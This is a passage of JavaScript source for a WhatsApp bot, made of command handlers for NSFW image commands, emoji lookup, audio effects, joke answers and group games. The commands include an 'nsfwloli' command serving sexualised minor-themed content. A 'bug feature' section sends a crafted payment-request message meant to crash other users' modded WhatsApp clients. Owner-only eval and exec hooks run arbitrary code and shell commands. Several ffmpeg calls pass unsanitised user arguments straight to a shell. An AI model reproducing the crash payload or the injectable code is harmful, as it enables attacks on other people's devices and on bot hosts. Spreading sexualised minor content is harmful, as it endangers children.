var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/gangbang.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/glasses.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/hentai.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/jahy.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/manga.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/masturbation.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/neko.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/neko2.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/nsfwloli.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/orgy.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/panties.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/pussy.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/tentacles.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/thights.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/yuri.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/zettai.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return replygcdeepak(mess.group)
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await DeepakBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return replygcdeepak(mess.group)
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/gifs.json'))
var deepakresultx = pickRandom(ahegaonsfw)
    await DeepakBotInc.sendMessage(m.chat,{video:deepakresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/foot.json')
DeepakBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcdeepak("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcdeepak("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcdeepak(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcdeepak('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await DeepakBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await DeepakBotInc.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcdeepak(`Example: ${prefix + command} 10`)
media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcdeepak('Error!')
jadie = fs.readFileSync(rname)
DeepakBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
DeepakBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcdeepak("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcdeepak('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcdeepak(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcdeepak(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGDEEPAK/DeepakMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcdeepak(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    DeepakBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcdeepak(mess.error))
break
case 'spotify':
if (!text) return replygcdeepak(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcdeepak(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await DeepakBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await DeepakBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replygcdeepak(mess.wait)
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                DeepakBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcdeepak(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcdeepak(e)
                }
                break
                case 'define': 
if (!q) return replygcdeepak(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcdeepak(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   DeepakBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcdeepak(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcdeepak(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcdeepak(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcdeepak(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcdeepak(jawab)
            }
            break
case 'where': {
if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcdeepak(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcdeepak(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcdeepak(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcdeepak(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcdeepak(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcdeepak(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const deepakkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
DeepakBotInc.sendMessage(m.chat, { text: deepakkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
DeepakBotInc.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsu.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return replygcdeepak(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
DeepakBotInc.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsu.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                DeepakBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcdeepak('Enter Query Title')
                replygcdeepak(mess.wait)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                DeepakBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcdeepak('Enter Query Title')
                replygcdeepak(mess.wait)
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                DeepakBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
	//bug feature
case 'bugpayment' : { //crashes mod whatsapps
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!text) return replygcdeepak(`Example : ${prefix + command} deepak bihari😂`)
const { deepakorwot } = require('./XBug/xeonbut2')
let teks = `${text}`
{
DeepakBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${deepakorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA DEEPAK`,"body": ` ${deepaktimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: xwebsite,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'bugreact':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
DeepakBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break

default:
if (budy.startsWith('<')) {
if (!DeepakTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!DeepakTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!DeepakTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
DeepakBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
DeepakBotInc.sendMessage("918348225320@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})